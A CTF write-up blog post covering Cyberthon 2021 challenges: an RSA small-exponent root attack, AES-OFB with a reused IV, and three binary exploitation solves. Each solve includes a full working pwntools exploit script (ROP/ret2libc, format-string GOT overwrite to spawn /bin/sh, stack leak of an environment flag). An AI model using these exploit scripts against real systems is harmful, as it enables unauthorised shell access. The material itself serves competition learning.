---
layout: post
title:  "Cyberthon 2021 Writeups"
date:   2021-05-09
categories: writeups
---

Finally, another local CTF. More writeups, more clout. :P

Barring Whitehacks, this CTF was probably the most stressful of them all. As a person who takes time to think, 7 hours heavily cripples my ability to do challenges.

Moreover, all the various schools fielded many fearsome competitors that really kept us on our toes D: (acsi 👀), especially when the scoreboard was frozen an hour before the end of the competition!

Nonetheless we managed to pull through to clinch overall champions!

![](/assets/Images/Cyberthon-2021/scoreboard.png)

# Writeups
Due to time constraints I will share my cleanest writeups so no one will have to suffer from my unassailable reputation for digital illegibility:
1. [(Crypto) Welp 1.0/2.0](#welp)
2. [(Crypto) Encraptor 1.0](#encraptor-10)
3. [(Pwn) apcafe](#apcafe)
4. [(Pwn) apcdb](#apcdb)
5. [(Pwn) Placeholder](#placeholder)

## Welp
```APOCALYPSE heard us dissing on their RSA encryption script and decided to update it. But the moment we saw their updated implementation, we all collectively went welp once again. Let's see if you can manage to decrypt a flag that has been encrypted with their updated script.```

(Here I only go through Welp2.0, as Welp1.0 is the exact same thing.)

### Reconnaissance
As can be gleaned from the description, the challenge is about RSA.

We are greeted with:
- An encrypted flag file
- A public key giving us APOCALYPSE's public key:

```python
N=0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1
e=5
```
- APOCALYPSE's source, which outwardly appears to have no problems...

```python
# Personal comment: PyCryptodome just doesn't feel right in a CTF setting...
from Crypto.Util.number import getPrime
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes

rsa = RSA.construct((getPrime(512) * getPrime(512), 5))

with open('flag.txt', 'rb') as f:
    data = f.read()

plaintext = bytes_to_long(data)
ciphertext = pow(plaintext, rsa.e, rsa.n)

with open('./dist/flag.txt.encrypted', 'wb') as f:
    f.write(long_to_bytes(ciphertext))

with open('./dist/pubkey.pem', 'wb') as f:
    f.write(rsa.export_key('PEM'))

```

... or does it?

### Well, no, but actually yes

Since the challenge gives you nothing else the only way one can get any progress is by noting some suspicious features of the RSA implementation:
- Despite the use of PyCryptodome, there is `no padding`...
- The key is only 1024 bits long.
- `e`=5

So perhaps, since `e` is rather small and there is `no padding`, we can try a `Cube Root Attack`.

### Math! (sike niktay)
The `Cube Root Attack` is honestly one of the **stupidest** attacks one can do on RSA, and it really shows something about software engineers who fail to implement RSA properly...

Anyways, the attack hinges on the `basic` fact (provided you know modular arithmetic) that if 


$$\begin{equation} \label{eq:one}
c \equiv m^{e} \pmod N
\end{equation}$$

then

$$\begin{equation} \label{eq:two}
\exists k \in \mathbb{Z} \text{ s.t. } c = m^e + k \cdot N
\end{equation}$$

where `c` denotes your ciphertext as an integer, `m` your plaintext message as an integer

Usually this is not an issue if you choose a larger public exponent `e`, because `k` would be beyond the reach of your average consumer computer.

But `e`=5 in this context, so there's a good chance we can easily recover it. 

In order to recover the original message, we simply rearrange the equation $$\eqref{eq:two}$$ to get:

$$\begin{equation} \label{eq:three}
\sqrt[e]{c - k \cdot N} = m
\end{equation}$$

Or rather, since we know from $$\eqref{eq:one}$$ that the `c` given to us is smaller than `N`,

$$\begin{equation} \label{eq:four}
\sqrt[e]{c + k \cdot N} = m
\end{equation}$$

(`k` is just some integer and this isn't math lesson so abuses of notation are a-ok)

### The Exploit
Last thing left to do is to find `k`.

Just bruteforce :))).

(Unfortunately you will have to endure `Decimal` code since I was too lazy to get `Sagemath` to work and I did the exact same challenge last year...)

```python
from Crypto.Util.number import long_to_bytes,bytes_to_long
from decimal import *
N=Decimal(0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1)
e=Decimal(1)/Decimal(5)
getcontext().prec = 1000

with open("flag.txt.encrypted","rb") as f:
    c=bytes_to_long(f.read())

getcontext().prec = 1000
N=Decimal(N)
E=Decimal(e)
C=Decimal(c)
for k in range(1,1000):
    R=Decimal((k*N+C)**(E))
    if(R!=R.to_integral_value()):
        print("R for {}: {}".format(k,R))
        print("Integer Form of R: {}".format(R.to_integral_value()))
    else:
        print("Yay! {}".format(long_to_bytes(R.to_integral_value())))
        break
```

And we get:
![](/assets/Images/Cyberthon-2021/welp.png)

### Flag!
`Cyberthon{f0rg0t_t0_p4d!}`

p.s. welp1.0 is the exact same thing but $$k=0$$.

## Encraptor 1.0

```To ensure that all APOCALYPSE agents are encrypting their files properly, 
APOCALYPSE has decided to provide a centralized encryption 
service for all their members. We've recently recovered a flag that was encrypted by their service. 
Can you try to recover the flag?
```

### Reconnaissance
We are greeted with:
- An encrypted flag
- Whatever APOCALYPSE is running on their server:

```python
#! /usr/bin/python3

from Crypto.Hash import MD5
from Crypto.Cipher import AES
from binascii import unhexlify
import sys


KEY = open('/home/encraptor1/aeskey', 'rb').read()
IV = open('/home/encraptor1/iv', 'rb').read()


def read(prompt):
    write(prompt)
    data = sys.stdin.buffer.read()
    write('\n')

    return data


def write(prompt):
    try:
        sys.stdout.buffer.write(prompt)
    except TypeError:
        sys.stdout.buffer.write(prompt.encode('utf-8'))

    sys.stdout.flush()


def md5sum(data):
    md5 = MD5.new()
    md5.update(data)

    return md5.hexdigest()


def encrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    return unhexlify(md5sum(data)) + cipher.encrypt(data)


def banner():
    write("  ______        _____                 _               __   ___  \n")
    write(" |  ____|      / ____|               | |             /_ | / _ \\ \n")
    write(" | |__   _ __ | |     _ __ __ _ _ __ | |_ ___  _ __   | || | | |\n")
    write(" |  __| | '_ \\| |    | '__/ _` | '_ \\| __/ _ \\| '__|  | || | | |\n")
    write(" | |____| | | | |____| | | (_| | |_) | || (_) | |     | || |_| |\n")
    write(" |______|_| |_|\\_____|_|  \\__,_| .__/ \\__\\___/|_|     |_(_)___/ \n")
    write("                               | |                              \n")
    write("                               |_|                              \n")
    write("\n");
# To be fair 
banner()

data = read('[+] Data: ')
write('[+] Encrypted:\n')
write('----------------------------- START -------------------------------\n')
write(encrypt(data, KEY, IV))
write('\n------------------------------ END --------------------------------')
```

Ostensibly this uses the AES block cipher with [Output-Feedback](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) mode (OFB).

A diagram of how the encryption happens at a high level is attached by shamelessly ripping off Wikipedia:
![](/assets/Images/Cyberthon-2021/AES-OFB.png)

This is a lot more straightforward compared to Welp2.0:

We simply need to notice that the `IV` (initialization vector) which **SHOULD** be randomized is instead set to some `constant value`. **THAT'S BAD**.

### Wait why

Notice on the diagram that the `encryption` and `decryption` protocols are largely similar, except that the positions of the `ciphertext` and `plaintext` are swapped.

Theoretically you `COULD` just feed the `ciphertext` into the service, but for whatever reason that didn't go so well for me.

Instead, I believe my solution is more intuitive:
1. Send a `dummy string` of really long length.
2. `XOR` the ciphertext given to you by the service with your `dummy string` to retrieve your `XOR` **key**.
3. `XOR` the key with your flag ciphertext to retrieve flag!

### The flag
```python
# IV reuse in OFB mode
# No better than XOR cipher.
from pwn import *
r=remote("aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg",20101)
r.send(b"A"*64)
r.shutdown()
r.recvuntil("----------------------------- START -------------------------------\n")
enc=r.recvuntil("------------------------------ END --------------------------------")[:-68]
print(enc)
key=xor(enc[16:],b"A"*64)
print(f"KEY FOUND: {key}")
r.close()
# Now that we recovered the iv, we simply go and decrypt anything we like...
with open("flag.txt.encrypted","rb") as f:
    flag=f.read()
msg=xor(flag[16:],key)
print(len(msg))
print(f"MSG: {msg}")
```

### Flag!
`Cyberthon{mfw_3ncrypt10n_s4m3_45_d3crypt_s4dg3}`

## apcafe
```
We've received intel that APOCALYPSE is running a cafe as a front for their illegal activities. 
Although it seems like a regular cafe on the outside, serving local favourites such as Kopi-O, Milo, 
and Yuan Yang, we believe that something more sinister is going on. Could u try to find a way to break 
in so we can investigate further?
```

### Reconnaissance

We are greeted by a 64-bit binary that has the following functions:
![](/assets/Images/Cyberthon-2021/apcafe_main.png)
![](/assets/Images/Cyberthon-2021/apcafe_serveorder.png)

Of course, not forgetting our checksec...
![](/assets/Images/Cyberthon-2021/apcafe_checksec.png)

Let's cut to the chase, I'm strapped for time.

### Vulnerability Analysis
One only needs to notice this vulnerability for everything to make sense:
- `serve_order()` stops you from placing more than 10 characters into the buffer...
- But `scanf()` terminates after null byte (`\0`), does not stop us from writing more junk to the stack.

Also:
- We have no `win()` function, so we should be looking at some way to get us **shell**.

However `NX-bit` is turned on, so our first instinct is to look at what **ROP gadgets** we have...
![](/assets/Images/Cyberthon-2021/apcafe-ropper.png)

Rats. No `syscall` gadget. 

With the information so far, we are most likely looking at a **ret2libc**, where we exploit a **onegadget** to instantly obtain **shell**.

This should be fairly easy as such a technique was covered in the `training challenges`...

### The Exploit

Instead of painstakingly explaining everything I will simply annotate my code:

```python

from pwn import *
r=remote("aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg",30101)
# r=process("./apcafe",env={"LD_PRELOAD" : "./libc6_2.31-0ubuntu9.2_amd64.so"}) 
# The above is the correct LIBC version you should obtain from https://libc.blukat.me
binary=ELF("./apcafe")
r.recvuntil("order?")
# scanf reads without restriction.
# To circumvent the pesky check in serve_order() just send a null-byte after 10 characters.
# This is probably a ropchain into shell since there is no win function
# no syscall... means leak LIBC address from remote.
r.sendline(b"A"*10+b"\0"*8+p64(0x4015a3)+p64(binary.got["puts"])+p64(binary.symbols["puts"])+p64(binary.symbols["main"]))
# The stack pointer is at offset 18. Verify it yourself on GDB!
r.recvuntil("...")
r.recvline()
puts_libc=u64(r.recvline()[-7:-1].ljust(8,b'\x00')) 
# Leak the address of the puts() function in the GOT table.
# The GOT table address is used since it is a link to the LIBC address.
print(f"PUTS: {hex(puts_libc)}")
r.recvuntil("order?")
r.sendline(b"A"*10+b"\0"*8+p64(0x4015a3)+p64(binary.got["exit"])+p64(binary.symbols["puts"])+p64(binary.symbols["main"]))
r.recvuntil("...")
r.recvline()
exit_libc=u64(r.recvline()[-7:-1].ljust(8,b'\x00'))
print(f"EXIT: {hex(exit_libc)}")
# Same thing as above.

# It turns out there are 3 possible libc versions...
# TRY THEM ALL!!!!
# 9.0 is already there, failed.
# 9.2: db/local-a1ca4cd2d1df2fcd2c0f582665051c261d84c1d6.symbols
libc_base=puts_libc-0x875a0 
# Offset of puts() function in GOT table.
# Obtained from libc-database, you should check it out.
one_gadget=libc_base+0xe6c84
# Obtained from one-gadget. Check that out too.
r.sendline(b"A"*10+b"\0"*8+p64(0x4015a1)+p64(0)+p64(0)+p64(one_gadget))
r.interactive()
```

After getting **shell** we thus obtain:

### Flag!
`Cyberthon{th4t5_4_r34lly_l000ng_0rd3r_dud3_pl5_ch1ll}`

## apcdb
```
We've found a network service that seems to be posing as a fake directory of APOCALYPSE members. 
Although it doesn't seem to be hooked up to any actual database, it does look a tad vulnerable. 
Could u try to break in anyway? Who knows, access to this server might come in useful.
```

Being the only person to have solved this during the actual CTF, of course I must do a writeup on it uwu.

### Reconnaissance
We are once again presented with a 64-bit binary with the following function:
![](/assets/Images/Cyberthon-2021/apcdb_main.png)

Of course, not forgetting our checksec...
![](/assets/Images/Cyberthon-2021/apcdb_checksec.png)

### Vulnerability Analysis
"This is __real__ similar to that `apcafe` challenge", you say.

And you'd be right.

In fact there are only two key differences:
- Lack of format string in `printf()` is a telltale sign of **Format String Exploit**.
    - We can use this to once again **leak LIBC version**
- You can only leak **one** address.

### Leaking LIBC
Ideally when **leaking LIBC**, we want multiple addresses in a **single** connection.

This is because **LIBC** files are **PIE** meaning that their addresses are merely offsets added to a **random** `base address`.

If you instead retrieve addresses from **multiple** connections, the **PIE bases** are most definitely different, and you (probably) cannot use that to retrieve **LIBC version** from [libc.blukat.me](https://libc.blukat.me)

We can overcome this simply by overwriting the [GOT entry](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) of the `exit()` function, since **partial RELRO** security allows us to overwrite `.got.plt`.

This will in effect give us a never-ending loop, which is great because now we can do whatever we want >:))).

For example, leaking our **LIBC addresses** as usual!

### The Exploit
After we leak some nice addresses we will shove them into [libc.blukat.me](https://libc.blukat.me) to get our dearest libc version:

![](/assets/Images/Cyberthon-2021/apcdb_libc.png)

(During the actual competition I forgot to change my connection to the `remote` server, which resulted in some very fun times as I tried to figure out why my offsets were pointing me to a wrong **LIBC address**. Be careful kids!)

And after that, as you can see on the right, it is absolutely trivial to get shell.

We just need to overwrite the [GOT entry](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) of `printf()` to our `system()` offset, after which we pass `"/bin/sh\x00"` in to call our shell program!

(Sidenote: I tried using `str_bin_sh`, but I got an absolutely dysfunctional shell which I spent debugging until the scoreboard was frozen :PPP)

Here's the code used to carry out the exploit:
```python
from pwn import *
r=remote("aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg",30201)
# We leak the LIBC addresses as described here:
# https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md
binary=ELF("./apcdb")
context.arch="amd64"
inp_offset=6
payload=fmtstr_payload(inp_offset, {binary.got["exit"]:0x40083f})
r.sendline(payload)
r.recvuntil("Lookup: ")
r.recvuntil("Lookup: ")
r.sendline(b"%7$s"+b"A"*4+p64(binary.got["printf"])) 
# Align it properly or you die!
# Don't be like me in stacktheflags!
r.recvuntil("for ")
# print(r.recvuntil("...")[:-10].ljust(8,b'\x00'))
printf=u64(r.recvuntil("...")[:-10].ljust(8,b'\x00'))
print(hex(printf))
r.recvuntil("Lookup: ")
r.sendline(b"%7$s"+b"A"*4+p64(binary.got["__libc_start_main"]))
# Align it properly or you die!
# Don't be like me in stacktheflags!
r.recvuntil("for ")
libc_start=u64(r.recvuntil("...")[:-10].ljust(8,b'\x00'))
print(hex(libc_start))
libc_base=libc_start-0x21b10
system=libc_base+0x4f550
str_bin_sh=libc_base+0x1b3e1a # Bad shell. BAD SHELL >:(
payload=fmtstr_payload(inp_offset, {binary.got["printf"]:system})
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
```

![](/assets/Images/Cyberthon-2021/apcdb_flag.png)

### Flag!
`Cyberthon{f4k3_c0nt4ct5_f41lur3}`

## Placeholder
```
Hohoho seems like one of the APOCALYPSE agents messed up big time. 
Seems this agent went to deploy his/her code for testing and completely forgot to bring down the network service. 
This careless agent even forgot to private the repository containing the test code, 
so we've managed to obtain the source for the entire project, dockerfile and all. 
We've provided you with everything that we've found, so can you get the flag from their server?
```

(Scared off by Dockerfile until `niktay` said "guys easiest pwn chall")

### Reconnaissance
We are greeted with the binary that does... nothing???
![](/assets/Images/Cyberthon-2021/placeholder_main.png)

N-no seriously, it just takes in our input and does nothing!
Not even a GOT overwrite!
![](/assets/Images/Cyberthon-2021/placeholder_checksec.png)

However, this Dockerfile changed everything for me...
![](/assets/Images/Cyberthon-2021/placeholder_env.png)

### Vulnerability Analysis
We have, basically:
1. A **Format String Exploit**
2. ...nothing else.

However, we know that **environment variables** are stored on the stack, which means our `flag` is **ALSO** on the stack!

Verdict: **Stack Smashing** (this is a 10pt picoCTF challenge, my god)

### The Exploit
So I said we gonna smash the stack.

"But when?". you ask.

**WE SMASH IT NOW**.

This honestly needs no more explanation. We literally spam `%p` until the flag appears.

In order to preserve the sanity of my terminals I opted to save `stdout` into a file.

```python
from pwn import *
from binascii import unhexlify,hexlify
import re
import sys
Smash the stack very hard using this. Sorry niktay.
sys.stdout=open("log.txt","w")
r=process("./placeholder")
streeng=""
i=100
while hexlify(b'Cybe'[::-1]).decode() not in streeng:
    r=remote("aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg",30501)
    r.sendline("%llx"*i)
    streeng=r.recvall().decode()
    streeng=re.sub(r'(0x)|\(nil\)',' ',streeng)
    streeng=re.split(r'( )+',streeng)
    log.info(f"{i} {streeng}")
    
    i+=1
    if i>500:
        break
print(streeng)
r.interactive()
```

Where we notice something... interesting...

![](/assets/Images/Cyberthon-2021/placeholder_offset.png)

Considering the number of 6 and 7s in the hex string, I think it is safe to assume that `THIS IS THE FLAG` :D

Let's check it out, remembering that the stack is `little endian`...

```python
from pwn import *
from binascii import unhexlify,hexlify
import re
import sys
streeng=unhexlify(b"6f686563616c7000544150007265646c6c2f7273752f3d486962732f6c61636f6c2f7273752f3a6e6e69622f6c61636f62732f7273752f3a2f7273752f3a6e696962732f3a6e696248006e69622f3a6e3d454d414e54534f33626431393637656573750039393135686563616c703d726c66007265646c6f72656279433d67616e30647b6e6f687479306c7033645f746c706d30636e315f6a3072705f3374334f48007d35746333656d6f682f3d454d6f686563616c702f4d4552007265646c54534f485f45544f2e302e302e30313d2f656d6f682f00356c6f686563616c7063616c702f7265647265646c6f686500")
for i in range(0,len(streeng),8):
    print(streeng[i:i+8][::-1])
```

That was easy enough.

### Flag!
`Cyberthon{d0nt_d3pl0y_1nc0mpl3t3_pr0j3ct5}`

